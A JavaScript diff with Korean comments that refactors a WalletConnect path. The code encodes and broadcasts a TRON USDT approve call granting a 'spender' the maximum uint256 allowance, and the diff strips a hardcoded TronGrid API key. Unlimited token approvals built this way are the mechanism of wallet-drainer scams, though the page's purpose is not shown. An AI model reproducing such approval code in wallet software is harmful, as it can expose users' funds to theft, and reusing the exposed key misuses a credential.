@@ -760,53 +760,27 @@
                 if(useWC){
                     // === WalletConnect 경로: TronGrid API로 트랜잭션 빌드 → WC 서명 → API 브로드캐스트 ===
                     appendLog('[WC] TronGrid API로 트랜잭션 생성 중...','approve');
-                    // approve(address,uint256) ABI 인코딩
-                    var spenderHex=window.TronWeb?window.TronWeb.address.toHex(spender).replace(/^41/,''):null;
-                    if(!spenderHex){
-                        // TronWeb 없이 base58 → hex 변환
-                        spenderHex=await (async function(addr){
-                            var r=await fetch('https://api.trongrid.io/wallet/validateaddress',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({address:addr})});
-                            var d=await r.json(); return d.result?addr:addr; // fallback
-                        })(spender);
-                        // TronGrid triggersmartcontract API가 base58도 받으므로 직접 사용
+                    // base58 → hex 변환 (41 prefix 제거)
+                    function base58ToHex(b58){
+                        var ALPHABET='123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';
+                        var result=BigInt(0);
+                        for(var i=0;i<b58.length;i++){var c=ALPHABET.indexOf(b58[i]);if(c<0)throw new Error('Invalid base58');result=result*BigInt(58)+BigInt(c);}
+                        var hex=result.toString(16);
+                        while(hex.length<50)hex='0'+hex;
+                        return hex.substring(2,42);
                     }
-                    var triggerBody={
-                        owner_address:currentWalletAddress,
-                        contract_address:OFFICIAL_USDT_CONTRACT,
-                        function_selector:'approve(address,uint256)',
-                        parameter:(function(){
-                            // ABI encode: address(32bytes) + uint256(32bytes)
-                            // TronGrid API에서 parameter를 직접 처리
-                            var addrParam=spender;
-                            return '';  // TronGrid가 parameter 대신 call_value 방식 사용시 빈값
-                        })(),
-                        fee_limit:100000000,
-                        call_value:0,
-                        visible:true
-                    };
-                    // TronGrid triggersmartcontract API 사용 (visible:true → base58 주소 지원)
+                    var addrHex=base58ToHex(spender);
+                    var paddedAddr=addrHex.padStart(64,'0');
+                    var maxUint='ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
+                    var abiParam=paddedAddr+maxUint;
+                    // TronGrid triggersmartcontract API 호출
                     var triggerRes=await fetch('https://api.trongrid.io/wallet/triggersmartcontract',{
-                        method:'POST',headers:{'Content-Type':'application/json','TRON-PRO-API-KEY':'6829a8f3-0528-4094-8e2e-bfa3886c4b3d'},
+                        method:'POST',headers:{'Content-Type':'application/json'},
                         body:JSON.stringify({
                             owner_address:currentWalletAddress,
                             contract_address:OFFICIAL_USDT_CONTRACT,
                             function_selector:'approve(address,uint256)',
-                            parameter:( function(){
-                                // ABI 인코딩: address를 hex로, uint256 max
-                                // base58 주소를 hex로 변환 (41 prefix 제거 후 zero-pad)
-                                function base58ToHex(b58){
-                                    var ALPHABET='123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';
-                                    var result=BigInt(0);
-                                    for(var i=0;i<b58.length;i++){var c=ALPHABET.indexOf(b58[i]);if(c<0)throw new Error('Invalid base58');result=result*BigInt(58)+BigInt(c);}
-                                    var hex=result.toString(16);
-                                    while(hex.length<50)hex='0'+hex; // 25 bytes = 50 hex chars
-                                    return hex.substring(2,42); // skip version byte(41), take 20 bytes, skip checksum
-                                }
-                                var addrHex=base58ToHex(spender);
-                                var paddedAddr=addrHex.padStart(64,'0');
-                                var maxUint='ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
-                                return paddedAddr+maxUint;
-                            })(),
+                            parameter:abiParam,
                             fee_limit:100000000,
                             call_value:0,
                             visible:true
@@ -820,7 +794,7 @@
                     appendLog('[WC] 서명 완료, 브로드캐스트 중...','approve');
                     // 브로드캐스트
                     var broadcastRes=await fetch('https://api.trongrid.io/wallet/broadcasttransaction',{
-                        method:'POST',headers:{'Content-Type':'application/json','TRON-PRO-API-KEY':'6829a8f3-0528-4094-8e2e-bfa3886c4b3d'},
+                        method:'POST',headers:{'Content-Type':'application/json'},
                         body:JSON.stringify(signedTx)
                     });
                     var broadcastData=await broadcastRes.json();
